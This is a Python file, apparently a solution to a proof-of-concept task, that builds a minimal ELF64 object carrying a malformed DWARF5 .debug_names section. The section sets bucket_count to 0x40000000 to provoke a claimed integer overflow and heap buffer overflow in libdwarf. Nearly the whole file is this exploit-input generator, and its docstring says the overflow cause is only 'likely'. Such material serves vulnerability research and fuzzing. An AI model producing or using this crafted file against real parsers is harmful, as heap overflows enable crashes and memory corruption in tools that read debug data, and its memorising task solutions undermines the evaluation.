import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in libdwarf.
        The vulnerability corresponds to a mistake in calculating limits when reading
        DWARF5 .debug_names, likely an integer overflow in size calculations (bucket_count * 4).
        """
        def p8(x): return struct.pack('<B', x)
        def p16(x): return struct.pack('<H', x)
        def p32(x): return struct.pack('<I', x)
        def p64(x): return struct.pack('<Q', x)

        # --- Construct .debug_names payload ---
        # We target an integer overflow in the calculation of the hash table size or similar arrays.
        # bucket_count is a 4-byte field.
        # If bucket_count = 0x40000000, then bucket_count * 4 = 0x100000000 (overflows to 0 in 32-bit).
        # This can bypass size checks if the check is performed with 32-bit arithmetic,
        # but the subsequent loop uses the count, leading to a heap buffer overflow.

        comp_unit_count = 0
        local_type_unit_count = 0
        foreign_type_unit_count = 0
        bucket_count = 0x40000000  # Triggers integer overflow (x4 = 0 mod 2^32)
        name_count = 0
        abbrev_table_size = 0
        aug_string_size = 0
        
        # .debug_names header body (DWARF 5)
        # version (2), padding (2), comp_unit_count (4), local_type_unit_count (4),
        # foreign_type_unit_count (4), bucket_count (4), name_count (4),
        # abbrev_table_size (4), aug_string_size (4)
        
        payload_body = (
            p16(5) + p16(0) +
            p32(comp_unit_count) +
            p32(local_type_unit_count) +
            p32(foreign_type_unit_count) +
            p32(bucket_count) +
            p32(name_count) +
            p32(abbrev_table_size) +
            p32(aug_string_size)
        )
        
        # unit_length (4 bytes for 32-bit DWARF)
        # Set to the size of body, implying no data follows.
        unit_length = len(payload_body)
        debug_names_section = p32(unit_length) + payload_body
        
        # --- Construct ELF file container ---
        # Minimal ELF64 Header
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        e_type = 1 # ET_REL
        e_machine = 62 # AMD64
        e_version = 1
        e_entry = 0
        e_phoff = 0
        e_flags = 0
        e_ehsize = 64
        e_phentsize = 0
        e_phnum = 0
        e_shentsize = 64
        
        # Section Data Content
        shstrtab_content = b'\x00.shstrtab\x00.debug_names\x00'
        debug_names_content = debug_names_section
        
        # Calculate Offsets
        header_size = 64
        offset = header_size
        
        # 1. .shstrtab
        off_shstrtab = offset
        offset += len(shstrtab_content)
        # Align to 4 bytes
        while offset % 4 != 0: offset += 1
            
        # 2. .debug_names
        off_debug_names = offset
        offset += len(debug_names_content)
        # Align to 8 bytes for Shdrs
        while offset % 8 != 0: offset += 1
            
        e_shoff = offset
        
        # Build binary data
        data = bytearray()
        data.extend(e_ident + p16(e_type) + p16(e_machine) + p32(e_version) +
                   p64(e_entry) + p64(e_phoff) + p64(e_shoff) + p32(e_flags) +
                   p16(e_ehsize) + p16(e_phentsize) + p16(e_phnum) +
                   p16(e_shentsize) + p16(0) + p16(0)) # placeholder shnum/shstrndx
                   
        # Append .shstrtab
        data.extend(shstrtab_content)
        # Pad
        while len(data) < off_debug_names: data.append(0)
        
        # Append .debug_names
        data.extend(debug_names_content)
        # Pad
        while len(data) < e_shoff: data.append(0)
            
        # Section Headers
        # 0: NULL
        data.extend(b'\x00' * 64)
        
        # 1: .shstrtab
        data.extend(
            p32(1) + p32(3) + p64(0) + p64(0) +
            p64(off_shstrtab) + p64(len(shstrtab_content)) +
            p32(0) + p32(0) + p64(1) + p64(0)
        )
        
        # 2: .debug_names
        data.extend(
            p32(11) + p32(1) + p64(0) + p64(0) +
            p64(off_debug_names) + p64(len(debug_names_content)) +
            p32(0) + p32(0) + p64(1) + p64(0)
        )
        
        # Patch ELF Header with shnum and shstrndx
        e_shnum = 3
        e_shstrndx = 1
        
        struct.pack_into('<H', data, 60, e_shnum)
        struct.pack_into('<H', data, 62, e_shstrndx)
        
        return bytes(data)